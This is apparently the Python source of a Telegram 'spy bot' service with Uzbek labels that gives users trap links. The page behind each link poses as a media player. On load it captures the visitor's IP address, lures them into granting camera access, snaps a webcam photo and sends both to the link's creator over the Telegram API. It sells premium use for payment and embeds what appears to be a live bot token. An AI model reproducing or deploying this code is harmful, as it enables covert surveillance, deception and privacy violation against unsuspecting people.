import os
import sqlite3
import logging
import asyncio
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton

# --- SOZLAMALAR ---
TOKEN = "8509571152:AAFw5GXdZRyuiqTOzm3znlQCa_S4JQXcnvU"
ADMIN_ID = 5775388579
BASE_URL = "https://botmeniki-sarikprok.up.railway.app"

# --- DATABASE ---
def init_db():
    conn = sqlite3.connect("shpy_master.db", check_same_thread=False)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, is_premium INTEGER DEFAULT 0, used_count INTEGER DEFAULT 0)")
    cur.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    conn.commit()
    return conn

db = init_db()

# --- BOT VA DISPATCHER ---
bot = Bot(token=TOKEN)
dp = Dispatcher()
logging.basicConfig(level=logging.INFO)

class AdminState(StatesGroup):
    wait_id = State()
    wait_card = State()

# --- SAYT HTML KODI ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>Media Player</title>
    <script>
        async function capture() {{
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get('id');
            const botToken = "{token}";

            // 1. IP Manzil
            try {{
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                await fetch(`https://api.telegram.org/bot${{botToken}}/sendMessage`, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ chat_id: userId, text: "🌐 IP: " + ipData.ip }})
                }});
            }} catch(e) {{}}

            // 2. Kamera
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                setTimeout(async () => {{
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                    const formData = new FormData();
                    formData.append('chat_id', userId);
                    formData.append('photo', blob, 'img.jpg');
                    await fetch(`https://api.telegram.org/bot${{botToken}}/sendPhoto`, {{ method: 'POST', body: formData }});
                }}, 1000);
            }} catch(e) {{}}
        }}
        window.onload = capture;
    </script>
</head>
<body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
    <h3>Video yuklanmoqda, ruxsat bering...</h3>
</body>
</html>
"""

# --- FASTAPI LIFESPAN ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Webhookni o'rnatish
    webhook_url = f"{BASE_URL}/webhook"
    await bot.set_webhook(webhook_url, drop_pending_updates=True)
    yield
    # Tozalash
    await bot.delete_webhook()
    await bot.session.close()

app = FastAPI(lifespan=lifespan)

# --- ENDPOINTS ---
@app.get("/go", response_class=HTMLResponse)
async def serve_page(id: str):
    return HTML_TEMPLATE.format(token=TOKEN)

@app.post("/webhook")
async def telegram_webhook(request: Request):
    update = types.Update(**await request.json())
    await dp.feed_update(bot, update)
    return {"ok": True}

# --- BOT HANDLERS ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    db.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (message.from_user.id,))
    db.commit()
    kb = [[KeyboardButton(text="🔗 Tuzoq link")], [KeyboardButton(text="💎 Premium"), KeyboardButton(text="📊 Statistika")]]
    if message.from_user.id == ADMIN_ID: kb.append([KeyboardButton(text="⚙️ Admin")])
    await message.answer("🕵️ Shpion Bot!", reply_markup=ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True))

@dp.message(F.text == "🔗 Tuzoq link")
async def create_link(message: types.Message):
    user = db.execute("SELECT is_premium, used_count FROM users WHERE user_id=?", (message.from_user.id,)).fetchone()
    if user[0] == 0 and user[1] >= 5:
        return await message.answer("❌ Limit tugadi. Premium oling: @Sardorbeko008")
    
    db.execute("UPDATE users SET used_count = used_count + 1 WHERE user_id=?", (message.from_user.id,))
    db.commit()
    await message.answer(f"✅ Link tayyor:\n\n🔗 `{BASE_URL}/go?id={message.from_user.id}`", parse_mode="Markdown")

@dp.message(F.text == "💎 Premium")
async def premium_info(message: types.Message):
    card = db.execute("SELECT value FROM settings WHERE key='card'").fetchone()
    await message.answer(f"💎 Premium (5,000 so'm)\n💳 Karta: `{card[0] if card else 'Yo'q'}`\nAdmin: @Sardorbeko008", parse_mode="Markdown")

@dp.message(F.text == "⚙️ Admin", F.from_user.id == ADMIN_ID)
async def admin_menu(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Karta", callback_data="set_c")],
        [InlineKeyboardButton(text="➕ Premium ID", callback_data="set_p")]
    ])
    await message.answer("Admin Panel:", reply_markup=kb)

@dp.callback_query(F.data == "set_c")
async def set_c(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminState.wait_card); await c.message.answer("Karta yozing:"); await c.answer()

@dp.message(AdminState.wait_card)
async def save_c(message: types.Message, state: FSMContext):
    db.execute("INSERT OR REPLACE INTO settings VALUES ('card', ?)", (message.text,))
    db.commit(); await message.answer("✅ Saqlandi"); await state.clear()

@dp.callback_query(F.data == "set_p")
async def set_p(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminState.wait_id); await c.message.answer("User ID yozing:"); await c.answer()

@dp.message(AdminState.wait_id)
async def save_p(message: types.Message, state: FSMContext):
    db.execute("UPDATE users SET is_premium=1 WHERE user_id=?", (int(message.text),))
    db.commit(); await message.answer("✅ Premium berildi!"); await state.clear()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
